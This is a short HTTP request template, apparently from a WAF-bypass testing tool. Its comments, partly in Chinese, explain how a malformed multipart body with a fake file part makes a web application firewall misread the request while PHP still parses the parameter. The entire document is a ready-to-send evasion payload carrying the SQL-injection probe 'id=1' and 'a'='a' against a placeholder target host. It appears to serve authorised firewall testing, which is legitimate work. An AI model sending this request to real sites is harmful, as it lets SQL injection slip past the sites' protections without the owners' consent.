# @name: multipart构造假part(v2)
# @tags: post,multipart,fake-part,no-newline,php,id,bypass
# @color: pink
# @validate: baseline_similarity
# @threshold: 0.92
# @intent: multipart_fake_part_v2
# @intent.param: id
# @intent.payload: id=1' and 'a'='a
# @note: 与 v1 类似但少一个换行：假 part 的 Content-Disposition 后直接跟 payload，数据更纯净，PHP 仍解析为 POST 参数而 WAF 误判上传。参考 do9gy multipart Part1 第5条，截图丢失按描述还原。
POST / HTTP/1.1
Host: {{TARGET_HOST_HEADER}}
User-Agent: {{USER_AGENT}}
Content-Type: multipart/form-data; boundary=a

--a
Content-Disposition: form-data; name="id"; filename="1.png"
--a
Content-Disposition: form-data; name="id"

1' and 'a'='a
--a--
